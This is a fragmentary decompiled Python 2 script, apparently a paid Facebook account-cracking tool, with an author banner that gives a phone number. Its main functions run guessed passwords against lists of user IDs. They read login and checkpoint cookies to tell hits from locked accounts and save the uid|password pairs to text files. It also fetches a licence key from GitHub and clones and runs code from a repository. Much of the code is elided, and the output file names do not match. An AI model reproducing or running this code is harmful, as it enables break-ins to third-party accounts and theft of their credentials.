...
# Time Succes decompile : 2022-03-08 15:47:43.044554
...
'\x1b[1;91m'   Author      :     JUNAID    
'\x1b[1;92m'   Github      :     SWATIJUNAID0
'\x1b[1;93m'   FB ID        :     JUNAID KHAN
'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS
'\x1b[1;96m'   WAP NUMBER  :    03418760856           
"""
dec="2"
server="2"
...
def main_apv():
    ...
    try:
        ...
        os.system("xdg-open https://wa.me/+923418760856")
        
    r1=requests.get("https://raw.githubusercontent.com/swatijunaid0/Jradi/main").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[1;92m        Member In Junaid Paid Commands ")
        print ("\x1b[1;91m        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/swatijunaid0/Jradi")
        os.system("rm -rf Jradi")
        os.system("cp -f Jradi/Jradi \\.")
        os.system("rm -rf Jradi")
        os.system(" cd Jradi")
        os.system(" python2 khanswati.py")
        time.sleep(5)
...
def numcloning():
    ...
    print "IF IDS NOT COMMING USE 5 second (airplane) FLIGHT MOD"
    os.system('echo " ------------------------------------"| lolcat')
    def main(arg):
        user = arg
        lines = random.choice([
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[JUNAID-OK] "+coc+user + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[JUNAID-CP] "+coc+user + " | " + pass1
...
def mineExt():
    ...
    print g+"[=] Extracting From JUNAID : "+my_line[:15]
...
def xokpauto():
    ...
    print "   Use Flight Mod 5 second For Speed Up"
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[JUNAID-OK] "+uid + " | " + pass1
                ok=open('JUNAID-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[JUNAID-CP] "+uid + " | " + pass1
                    cp=open('JUNAID-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[JUNAID-OK] "+uid + " | " + pass2
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[JUNAID-CP] "+uid + " | " + pass2
                            cp=open('JUNAID-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[JUNAID-OK] "+uid + " | " + pass3
                                ok=open('JUNAID-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[JUNAID-CP] "+uid + " | " + pass3
                                    cp=open('JUNAID-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[JUNAID-OK] "+uid + " | " + pass4
                                        ok=open('JUNAID-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[JUNAID-CP] "+uid + " | " + pass4
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[JUNAID-OK] "+uid + " | " + pass5
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[JUNAID-CP] "+uid + " | " + pass5
                                                    cp=open('IMTIAZ-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def xokp():
    ...
    os.system('echo " -----------------------------------"| lolcat')
    print "    Cracking Start Please Wait ..   "
    print "    Use Airplane Mod 5 secound For Up Speed "
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[JUNAID-OK] "+uid + " | " + pass6
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[JUNAID-CP] "+uid + " | " + pass6
                                                            cp=open('IMTIAZ-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
